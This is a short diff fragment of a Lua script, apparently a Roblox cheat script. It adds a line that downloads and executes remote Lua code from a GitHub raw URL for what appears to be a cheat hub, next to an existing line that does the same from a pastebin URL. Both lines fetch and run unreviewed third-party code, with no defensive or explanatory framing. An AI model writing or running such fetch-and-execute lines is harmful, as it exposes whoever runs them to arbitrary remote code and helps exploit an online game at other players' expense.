@@ -141,3 +141,4 @@ end)
 
 
 loadstring(game:HttpGet('https://pastebin.com/raw/nZDr7ume'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubBEST.lua"))()
